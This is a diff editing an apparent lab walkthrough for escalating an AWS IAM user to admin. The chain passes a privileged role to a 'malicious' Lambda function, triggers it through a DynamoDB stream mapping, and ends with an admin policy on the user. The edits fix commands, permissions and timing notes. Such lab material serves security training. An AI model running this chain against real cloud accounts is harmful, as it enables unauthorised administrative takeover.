@@ -22,8 +22,10 @@ The Terraform-created resources in play are:
 First, confirm your identity and check what you're working with:
 
 ```bash
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+
 aws sts get-caller-identity --query 'Arn' --output text
-# arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-admin-starting-user
+# arn:aws:iam::<your account>:user/pl-prod-lambda-002-to-admin-starting-user
 ```
 
 Verify you don't already have admin access:
@@ -48,10 +50,13 @@ The table has streams enabled — that's your passive trigger. Any write to this
 Check what roles are available to pass. You have `iam:PassRole` on a specific role ARN, but you can also use `iam:ListRoles` if granted to explore:
 
 ```bash
-aws iam get-role --role-name pl-prod-lambda-002-to-admin-target-role \
-  --query 'Role.Arn' --output text
-# arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role
+aws iam list-roles \
+  --query "Roles[?RoleName=='pl-prod-lambda-002-to-admin-target-role'].Arn" \
+  --output text
+# arn:aws:iam::<your account>:role/pl-prod-lambda-002-to-admin-target-role
 ```
+
+Your grants include `iam:ListRoles` but not `iam:GetRole`, so list and filter.
 
 ## Exploitation
 
@@ -98,7 +103,7 @@ SG_ID=$(aws ec2 describe-security-groups \
 aws lambda create-function \
   --function-name pl-prod-lambda-002-malicious-lambda \
   --runtime python3.11 \
-  --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role \
+  --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-002-to-admin-target-role \
   --handler lambda_function.lambda_handler \
   --zip-file fileb:///tmp/lambda_payload.zip \
   --timeout 30 \
@@ -123,19 +128,19 @@ STREAM_ARN=$(aws dynamodb describe-table \
   --table-name pl-prod-lambda-002-to-admin-trigger-table \
   --query 'Table.LatestStreamArn' --output text)
 
-aws lambda create-event-source-mapping \
+UUID=$(aws lambda create-event-source-mapping \
   --function-name pl-prod-lambda-002-malicious-lambda \
   --event-source-arn "$STREAM_ARN" \
-  --starting-position LATEST
+  --starting-position TRIM_HORIZON \
+  --query 'UUID' --output text)
 ```
 
-The mapping starts in a `Creating` state and takes up to a minute to become `Enabled`. Wait for it:
+`TRIM_HORIZON` makes the mapping read the stream from its oldest record. A `LATEST` mapping permanently skips every record written before its poller starts reading -- on a hosted deployment, that window can swallow your first trigger record. With `TRIM_HORIZON`, nothing you write is skipped, no matter when the poller starts.
+
+Capture the mapping UUID from the create response; `lambda:ListEventSourceMappings` is not part of your grants, but `lambda:GetEventSourceMapping` is. The mapping reports `Enabled` quickly, and its poller still needs up to about two minutes to start reading after that:
 
 ```bash
-UUID=$(aws lambda list-event-source-mappings \
-  --function-name pl-prod-lambda-002-malicious-lambda \
-  --query 'EventSourceMappings[0].UUID' --output text)
-
+# Poll until state is Enabled
 aws lambda get-event-source-mapping --uuid "$UUID" \
   --query 'State' --output text
 # Enabled
@@ -151,9 +156,7 @@ aws dynamodb put-item \
   --item '{"id": {"S": "trigger-1"}}'
 ```
 
-The Lambda executes asynchronously.
-
-If the policy has not attached about 30 seconds after the first write, write another record with a new key. A record written in the same moments the mapping initializes can be skipped by its LATEST position - a new key is always processed: Wait 10-15 seconds for execution and IAM policy propagation. If the first write doesn't trigger it (event source mappings can take a few more seconds to fully initialize after showing `Enabled`), insert another record and wait again.
+The Lambda executes asynchronously. Wait 10-15 seconds, then check for the attachment with the `list-attached-user-policies` call in the Verification step below. The mapping's poller can take up to about two minutes to pick the record up after the mapping shows `Enabled`, so give it that long before you worry. If the policy still isn't attached after that, insert another record with a new key and check again.
 
 ## Verification
 
